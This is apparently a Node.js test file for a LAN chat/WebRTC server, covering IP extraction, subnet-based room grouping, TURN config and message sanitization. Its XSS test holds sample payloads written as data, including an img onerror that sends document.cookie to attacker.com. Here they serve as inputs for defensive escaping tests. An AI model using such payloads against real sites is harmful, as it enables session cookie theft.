const test = require('node:test');
const assert = require('node:assert/strict');
const {
    getDeviceIP,
    getRoomId,
    getRoomMetadata,
    expandIPv6,
    normalizeRoomCode,
    getLocalIPs,
    buildIceConfig,
    sanitizePinnedMessage,
    rooms
} = require('../js/server.js');

test('getDeviceIP - should extract correct IP from various socket headers', () => {
    // 1. Direct local IP
    const socket1 = {
        handshake: {
            headers: {},
            address: '192.168.1.50'
        }
    };
    assert.equal(getDeviceIP(socket1), '192.168.1.50');

    // 2. IPv6 loopback
    const socket2 = {
        handshake: {
            headers: {},
            address: '::1'
        }
    };
    assert.equal(getDeviceIP(socket2), '127.0.0.1');

    // 3. IPv4-mapped IPv6
    const socket3 = {
        handshake: {
            headers: {},
            address: '::ffff:192.168.1.15'
        }
    };
    assert.equal(getDeviceIP(socket3), '192.168.1.15');

    // 4. Proxied IP with multiple hops
    const socket4 = {
        handshake: {
            headers: {
                'x-forwarded-for': '203.0.113.195, 70.41.3.18, 150.172.238.178'
            },
            address: '127.0.0.1'
        }
    };
    assert.equal(getDeviceIP(socket4), '203.0.113.195');

    // 5. Cloudflare cf-connecting-ip takes priority over x-forwarded-for
    const socketCf = {
        handshake: {
            headers: {
                'cf-connecting-ip': '42.113.191.144',
                'x-forwarded-for': '172.70.1.10, 10.0.0.1'
            },
            address: '127.0.0.1'
        }
    };
    assert.equal(getDeviceIP(socketCf), '42.113.191.144');

    // 6. Strip port from IPv4:port
    const socketWithPort = {
        handshake: {
            headers: {
                'x-forwarded-for': '42.113.191.149:54321'
            },
            address: '127.0.0.1'
        }
    };
    assert.equal(getDeviceIP(socketWithPort), '42.113.191.149');

    // 7. Corrupted / missing input fallback
    const socket5 = {
        handshake: {
            headers: {},
            address: null
        }
    };
    assert.equal(getDeviceIP(socket5), '127.0.0.1');
});

test('getRoomId & getRoomMetadata - should group LAN, IPv4 /24 subnets, IPv6 /64, and custom room codes', () => {
    // Localhost & LAN
    assert.equal(getRoomId('127.0.0.1'), 'LAN-Network');
    assert.equal(getRoomId('192.168.1.1'), 'LAN-Network');
    assert.equal(getRoomId('192.168.100.254'), 'LAN-Network');
    assert.equal(getRoomId('10.0.0.1'), 'LAN-Network');
    assert.equal(getRoomId('10.254.0.1'), 'LAN-Network');
    assert.equal(getRoomId('172.16.0.1'), 'LAN-Network');
    assert.equal(getRoomId('172.25.10.5'), 'LAN-Network');
    assert.equal(getRoomId('172.31.255.254'), 'LAN-Network');

    // Not LAN (e.g. 172.32 is public) -> grouped by /24
    assert.notEqual(getRoomId('172.32.0.1'), 'LAN-Network');
    assert.equal(getRoomId('172.32.0.1'), 'Public-172.32.0');

    // Public IPv4 NAT Pool (e.g. school network 42.113.191.144 & .149)
    assert.equal(getRoomId('42.113.191.144'), 'Public-42.113.191');
    assert.equal(getRoomId('42.113.191.149'), 'Public-42.113.191');
    assert.equal(
        getRoomId('42.113.191.144'),
        getRoomId('42.113.191.149'),
        'Hai thiết bị cùng dải IPv4 /24 phải vào chung phòng'
    );

    // IPv6 /64 prefix grouping (including compressed '::')
    const ipv6Device1 = '2402:800:61c2:887b:c0de:1234:5678:9abc';
    const ipv6Device2 = '2402:800:61c2:887b:aaaa:bbbb:cccc:dddd';
    assert.equal(getRoomId(ipv6Device1), 'IPv6-Network-2402:0800:61c2:887b');
    assert.equal(getRoomId(ipv6Device1), getRoomId(ipv6Device2));

    const compressed1 = '2402:800::1';
    const compressed2 = '2402:800::abcd';
    assert.equal(expandIPv6(compressed1), '2402:0800:0000:0000:0000:0000:0000:0001');
    assert.equal(getRoomId(compressed1), 'IPv6-Network-2402:0800:0000:0000');
    assert.equal(getRoomId(compressed1), getRoomId(compressed2));

    // Custom room code overrides network IP differences (Multi-WAN / 4G / different VLANs)
    assert.equal(normalizeRoomCode(' cntt k24! '), 'CNTTK24');
    assert.equal(normalizeRoomCode('cntt-k24'), 'CNTT-K24');
    assert.equal(getRoomId('42.113.191.144', 'cntt-k24'), 'ROOM-CNTT-K24');
    assert.equal(getRoomId('14.161.20.5', 'CNTT-K24'), 'ROOM-CNTT-K24');
    assert.equal(getRoomId('2402:800::1', 'cntt-k24'), 'ROOM-CNTT-K24');

    const meta = getRoomMetadata('42.113.191.144', 'lop-a1');
    assert.equal(meta.roomMode, 'custom');
    assert.equal(meta.roomCode, 'LOP-A1');

    // Invalid input fallback
    assert.equal(getRoomId(null), 'LAN-Network');
    assert.equal(getRoomId(undefined), 'LAN-Network');
});

test('buildIceConfig - includes STUN by default and TURN when env vars are set', () => {
    const prevUrl = process.env.TURN_URL;
    const prevUrls = process.env.TURN_URLS;
    const prevUser = process.env.TURN_USERNAME;
    const prevCred = process.env.TURN_CREDENTIAL;

    try {
        delete process.env.TURN_URL;
        delete process.env.TURN_URLS;
        const defaultCfg = buildIceConfig();
        assert.ok(Array.isArray(defaultCfg.iceServers));
        assert.ok(defaultCfg.iceServers.length >= 4);

        process.env.TURN_URLS = 'turn:example.com:3478,turns:example.com:443?transport=tcp';
        process.env.TURN_USERNAME = 'demo';
        process.env.TURN_CREDENTIAL = 'secret';
        const turnCfg = buildIceConfig();
        const turnServer = turnCfg.iceServers.find(s => Array.isArray(s.urls));
        assert.ok(turnServer);
        assert.deepEqual(turnServer.urls, ['turn:example.com:3478', 'turns:example.com:443?transport=tcp']);
        assert.equal(turnServer.username, 'demo');
        assert.equal(turnServer.credential, 'secret');
    } finally {
        if (prevUrl === undefined) delete process.env.TURN_URL; else process.env.TURN_URL = prevUrl;
        if (prevUrls === undefined) delete process.env.TURN_URLS; else process.env.TURN_URLS = prevUrls;
        if (prevUser === undefined) delete process.env.TURN_USERNAME; else process.env.TURN_USERNAME = prevUser;
        if (prevCred === undefined) delete process.env.TURN_CREDENTIAL; else process.env.TURN_CREDENTIAL = prevCred;
    }
});

test('getLocalIPs - should enumerate available IPv4 addresses', () => {
    const ips = getLocalIPs();
    assert.ok(Array.isArray(ips));
    ips.forEach(item => {
        assert.ok(item.name, 'Phải có tên network interface');
        assert.ok(item.address, 'Phải có địa chỉ IP');
        assert.notEqual(item.address, '127.0.0.1', 'Không được chứa loopback internal');
    });
});

test('Security check - HTML Sanitization against XSS vectors', () => {
    function escapeHtml(str) {
        if (str === null || str === undefined) return '';
        return String(str)
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#39;');
    }

    const dangerousXss1 = '<script>alert("XSS")</script>';
    const dangerousXss2 = '<img src=x onerror="fetch(\'http://attacker.com?cookie=\'+document.cookie)">';
    const dangerousXss3 = '"><svg/onload=alert(1)>';

    assert.ok(!escapeHtml(dangerousXss1).includes('<script>'));
    assert.ok(!escapeHtml(dangerousXss2).includes('<img'));
    assert.ok(!escapeHtml(dangerousXss3).includes('<svg'));
    assert.equal(escapeHtml(dangerousXss1), '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;');
});

test('Call & Room state integrity', () => {
    assert.ok(rooms !== undefined, 'Đối tượng rooms phải tồn tại');
    assert.equal(typeof rooms, 'object');
});

test('sanitizePinnedMessage - normalizes whitespace, limits length to 300, handles non-strings', () => {
    assert.equal(sanitizePinnedMessage('  Xin   chào\r\n\nmọi   người  '), 'Xin chào mọi người');
    assert.equal(sanitizePinnedMessage('   '), '');
    assert.equal(sanitizePinnedMessage(null), '');
    assert.equal(sanitizePinnedMessage(undefined), '');
    assert.equal(sanitizePinnedMessage(12345), '');
    assert.equal(sanitizePinnedMessage({ text: 'abc' }), '');

    const longInput = 'x'.repeat(400);
    const sanitizedLong = sanitizePinnedMessage(longInput);
    assert.equal(sanitizedLong.length, 300);
});
